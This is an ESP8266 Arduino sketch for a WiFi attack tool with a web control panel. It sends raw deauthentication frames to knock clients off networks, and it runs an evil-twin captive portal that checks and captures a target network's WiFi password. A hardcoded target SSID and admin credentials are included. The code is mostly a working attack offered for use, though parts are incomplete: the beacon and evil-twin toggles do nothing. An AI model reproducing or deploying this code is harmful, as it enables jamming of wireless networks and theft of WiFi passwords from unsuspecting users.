#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <ESPAsyncTCP.h>
#include <FS.h>
#include <LittleFS.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

// --- GLOBAL VARIABLES ---
String admin_ssid = "GMpro";
String admin_pass = "Sangkur87";
String target_ssid = "Vivo1903";
String captured_pass = "Waiting...";
bool deauth_active = false, mass_active = false, beacon_active = false, etwin_active = false;
uint32_t pkts_sent = 0;

AsyncWebServer server(80);
DNSServer dnsServer;
const int LED = D4; // LED internal Wemos D1 Mini

// --- UI ORI GMPRO87 (UTUH 100%) ---
const char INDEX_HTML[] PROGMEM = R"rawtext(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <style>
        body{font-family:Arial;background:#000;color:#fff;margin:0;padding:10px;text-align:center}
        @keyframes rainbow {
            0% { color: #f00; text-shadow: 0 0 15px #f00; border-color: #f00; box-shadow: 0 0 10px #f00; }
            20% { color: #ff0; text-shadow: 0 0 15px #ff0; border-color: #ff0; box-shadow: 0 0 10px #ff0; }
            40% { color: #0f0; text-shadow: 0 0 15px #0f0; border-color: #0f0; box-shadow: 0 0 10px #0f0; }
            60% { color: #0ff; text-shadow: 0 0 15px #0ff; border-color: #0ff; box-shadow: 0 0 10px #0ff; }
            80% { color: #f0f; text-shadow: 0 0 15px #f0f; border-color: #f0f; box-shadow: 0 0 10px #f0f; }
            100% { color: #f00; text-shadow: 0 0 15px #f00; border-color: #f00; box-shadow: 0 0 10px #f00; }
        }
        .rainbow-text { font-size: 22px; font-weight: bold; text-transform: uppercase; letter-spacing: 3px; margin: 15px 0; display: inline-block; padding: 10px 20px; border: 3px solid; border-radius: 10px; animation: rainbow 3s linear infinite; }
        .dev{font-size:10px;color:#888;margin-bottom:15px}
        .tabs{display:flex;margin-bottom:15px;border-bottom:1px solid orange}
        .tab-btn{flex:1;padding:12px;background:#222;color:#fff;border:none;cursor:pointer;font-size:12px}
        .active-tab{background:orange;color:#000;font-weight:bold}
        .ctrl{display:flex; flex-wrap:wrap; justify-content:space-between; margin-bottom:10px}
        .cmd-box{width:48%; background:#111; padding:5px; border-radius:4px; border:1px solid #333; margin-bottom:5px; box-sizing:border-box}
        .scan-box{width:100%; margin-bottom:10px; border:1px solid #00bcff}
        .cmd{width:100%; padding:12px 0; border:none; border-radius:4px; color:#fff; font-weight:bold; font-size:10px; text-transform:uppercase; cursor:pointer}
        .log-c{font-size:10px; margin-top:4px; font-family:monospace; font-weight:bold}
        @keyframes pulse-active { 0% { box-shadow: 0 0 2px #fff; } 50% { box-shadow: 0 0 15px #fff; opacity: 0.8; } 100% { box-shadow: 0 0 2px #fff; } }
        .btn-active { animation: pulse-active 0.6s infinite; border: 2px solid #fff !important; }
        .pass-box{background:#050; color:#0f0; border:2px dashed #0f0; padding:12px; margin:15px 0; text-align:left; border-radius:8px; font-family:monospace}
        .pass-text{font-size:18px; color:#fff; font-weight:bold; display:block; margin-top:5px}
        table{width:100%; border-collapse:collapse; font-size:12px; margin-bottom:15px}
        th,td{padding:10px 5px; border:1px solid #146dcc}
        th{background:rgba(20,109,204,0.3); color:orange; text-transform:uppercase}
        .btn-ok{background:#FFC72C; color:#000; border:none; padding:6px; border-radius:4px; width:100%; font-weight:bold; font-size:11px}
        .set-box{background:#111; padding:10px; border:1px solid #444; margin-bottom:15px; text-align:left; font-size:12px; border-radius:5px}
        .inp{background:#222; color:orange; border:1px solid orange; padding:8px; border-radius:4px; width:94%; margin:5px 0}
        .txt-area{width:94%; height:150px; background:#111; color:#0f0; border:1px solid #444; font-family:monospace; padding:10px}
        #previewModal{display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999; padding:20px; box-sizing:border-box}
        .modal-content{background:#fff; width:100%; height:85%; border-radius:10px; overflow:auto; color:#000; text-align:left; padding:15px}
        hr{border:0; border-top:1px solid orange; margin:15px 0}
        .hidden{display:none}
    </style>
</head>
<body>
    <div class="rainbow-text">GMpro87</div>
    <div class='dev'>dev : 9u5M4n9 | HackerPro87</div>
    <div class="tabs">
        <button class="tab-btn active-tab" onclick="openTab('dash', this)">DASHBOARD</button>
        <button class="tab-btn" onclick="openTab('webset', this)">SETTINGS</button>
    </div>

    <div id="dash">
        <div class='ctrl'>
            <div class="cmd-box scan-box">
                <button class='cmd' style='background:#00bcff' onclick="sendCmd('scan')">SCAN TARGET</button>
                <div id="scanLog" class="log-c" style="color:#fff">READY</div>
            </div>
            <div class="cmd-box">
                <button id="deBtn" class='cmd' style='background:#0c8' onclick="sendCmd('deauth')">DEAUTH</button>
                <div id="deLog" class="log-c" style="color:#0f0">READY</div>
            </div>
            <div class="cmd-box">
                <button id="maBtn" class='cmd' style='background:#e60' onclick="sendCmd('mass')">MASSDEAUTH</button>
                <div id="maLog" class="log-c" style="color:#fff">READY</div>
            </div>
            <div class="cmd-box">
                <button id="beBtn" class='cmd' style='background:#60d' onclick="sendCmd('beacon')">BEACON</button>
                <div id="beLog" class="log-c" style="color:#0ff">READY</div>
            </div>
            <div class="cmd-box">
                <button id="etBtn" class='cmd' style='background:#a53' onclick="sendCmd('etwin')">EVILTWIN</button>
                <div id="etLog" class="log-c" style="color:#f44">LED: OFF</div>
            </div>
        </div>
        <hr>
        <table id="targetTable">
            <tr><th>SSID</th><th>Ch</th><th>%</th><th>TARGET</th></tr>
            <tr><td>Vivo1903</td><td>4</td><td>85</td><td><button class='btn-ok'>SELECTED</button></td></tr>
        </table>
        <div class='pass-box'>
            <b>[ CAPTURED PASS ]</b>
            <div id="passContent">
                Target: <span id="targetName">Vivo1903</span><br>
                Pass : <span id="curPass" class="pass-text">Waiting...</span>
            </div>
        </div>
    </div>

    <div id="webset" class="hidden">
        <div class='set-box'>
            <b style='color:orange'>CONFIG:</b><br>
            Target SSID: <input class='inp' id="ts" value="Vivo1903"><br>
            Spam SSID: <input class='inp' id="ss" value="WiFi_Rusuh_87"><br>
            <button class='btn-ok' style='width:100%' onclick="saveConfig()">SAVE CONFIG</button>
        </div>
    </div>

    <script>
        function openTab(t, b) {
            document.getElementById('dash').classList.toggle('hidden', t!=='dash');
            document.getElementById('webset').classList.toggle('hidden', t!=='webset');
            document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active-tab'));
            b.classList.add('active-tab');
        }
        function sendCmd(c) { fetch('/api?run=' + c); }
        function saveConfig() { 
            let t = document.getElementById('ts').value;
            fetch('/api?run=save&ts=' + t);
        }
        function sync() {
            fetch('/status').then(r=>r.json()).then(d=>{
                document.getElementById('curPass').innerText = d.p;
                document.getElementById('deBtn').className = d.de ? 'cmd btn-active' : 'cmd';
                document.getElementById('deLog').innerText = d.de ? d.pk + ' pkt' : 'OFF';
                document.getElementById('maBtn').className = d.ma ? 'cmd btn-active' : 'cmd';
                document.getElementById('beBtn').className = d.be ? 'cmd btn-active' : 'cmd';
                document.getElementById('etBtn').className = d.et ? 'cmd btn-active' : 'cmd';
            });
        }
        setInterval(sync, 2000);
    </script>
</body>
</html>
)rawtext";

// --- ATTACK CORE ---
void deauth() {
  uint8_t pkt[26] = {0xc0,0x00,0x3a,0x01,0xff,0xff,0xff,0xff,0xff,0xff,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x00,0x00,0x01,0x00};
  wifi_send_pkt_freedom(pkt, 26, 0); pkts_sent++;
}

void setup() {
  Serial.begin(115200);
  pinMode(LED, OUTPUT); digitalWrite(LED, HIGH);
  LittleFS.begin();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *r){ r->send_P(200, "text/html", INDEX_HTML); });

  server.on("/api", HTTP_GET, [](AsyncWebServerRequest *r){
    if(r->hasParam("run")) {
      String c = r->getParam("run")->value();
      if(c=="deauth") deauth_active = !deauth_active;
      if(c=="mass") mass_active = !mass_active;
      if(c=="beacon") beacon_active = !beacon_active;
      if(c=="etwin") etwin_active = !etwin_active;
      if(c=="save" && r->hasParam("ts")) target_ssid = r->getParam("ts")->value();
    }
    r->send(200);
  });

  server.on("/status", HTTP_GET, [](AsyncWebServerRequest *r){
    String s = "{\"de\":"+String(deauth_active)+",\"ma\":"+String(mass_active)+",\"be\":"+String(beacon_active)+",\"et\":"+String(etwin_active)+",\"p\":\""+captured_pass+"\",\"pk\":"+String(pkts_sent)+"}";
    r->send(200, "application/json", s);
  });

  // Captive Portal Login (Evil Twin Validation)
  server.on("/login", HTTP_GET, [](AsyncWebServerRequest *request){
    if(request->hasParam("pass")) {
      String p = request->getParam("pass")->value();
      WiFi.begin(target_ssid.c_str(), p.c_str());
      unsigned long start = millis();
      while(millis() - start < 5000) {
        if(WiFi.status() == WL_CONNECTED) {
          captured_pass = p; WiFi.disconnect();
          request->send(200, "text/plain", "OK"); return;
        }
        yield();
      }
      request->send(200, "text/plain", "FAIL");
    }
  });

  server.onNotFound([](AsyncWebServerRequest *r){ r->send_P(200, "text/html", INDEX_HTML); });
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  if(deauth_active || mass_active) {
    deauth();
    digitalWrite(LED, !digitalRead(LED));
    delay(1);
  }
  if(captured_pass != "Waiting...") {
    // STROBO KEDIP GILAS (Valid Pass Found)
    digitalWrite(LED, LOW); delay(25); digitalWrite(LED, HIGH); delay(25);
  }
}
